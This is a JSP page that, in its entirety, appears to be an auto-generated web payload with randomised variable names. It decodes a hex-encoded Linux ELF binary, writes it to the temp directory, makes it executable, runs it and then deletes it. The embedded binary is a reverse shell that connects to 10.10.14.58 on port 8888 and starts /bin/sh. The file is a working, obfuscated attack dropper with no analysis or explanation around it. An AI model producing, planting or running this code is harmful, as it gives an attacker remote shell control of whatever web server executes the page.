<%@ page import="java.io.*" %>
<%
  String pNfhOfgXlEaG = "7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000007000000000000000000000000004000000000000000400000000000c2000000000000000c0100000000000000100000000000006a2958996a025f6a015e0f05489748b9020022b80a0a0e3a514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05";
  String qfwHfinyTEwBeYz = System.getProperty("java.io.tmpdir") + "/grUehyHFaZujkGC";

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
    qfwHfinyTEwBeYz = qfwHfinyTEwBeYz.concat(".exe");
  }

  int CXZBSwPTZLxm = pNfhOfgXlEaG.length();
  byte[] AOrLFRGq = new byte[CXZBSwPTZLxm/2];
  for (int yMtIEIrxNxJr = 0; yMtIEIrxNxJr < CXZBSwPTZLxm; yMtIEIrxNxJr += 2) {
    AOrLFRGq[yMtIEIrxNxJr / 2] = (byte) ((Character.digit(pNfhOfgXlEaG.charAt(yMtIEIrxNxJr), 16) << 4)
                                              + Character.digit(pNfhOfgXlEaG.charAt(yMtIEIrxNxJr+1), 16));
  }

  FileOutputStream conofIhHRuqLibX = new FileOutputStream(qfwHfinyTEwBeYz);
  conofIhHRuqLibX.write(AOrLFRGq);
  conofIhHRuqLibX.flush();
  conofIhHRuqLibX.close();

  if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1){
    String[] whIlhycR = new String[3];
    whIlhycR[0] = "chmod";
    whIlhycR[1] = "+x";
    whIlhycR[2] = qfwHfinyTEwBeYz;
    Process tmCMbAostVogP = Runtime.getRuntime().exec(whIlhycR);
    if (tmCMbAostVogP.waitFor() == 0) {
      tmCMbAostVogP = Runtime.getRuntime().exec(qfwHfinyTEwBeYz);
    }

    File DrHMjtjhwmz = new File(qfwHfinyTEwBeYz); DrHMjtjhwmz.delete();
  } else {
    String[] HFaywTaQQhVVG = new String[1];
    HFaywTaQQhVVG[0] = qfwHfinyTEwBeYz;
    Process tmCMbAostVogP = Runtime.getRuntime().exec(HFaywTaQQhVVG);
  }
%>
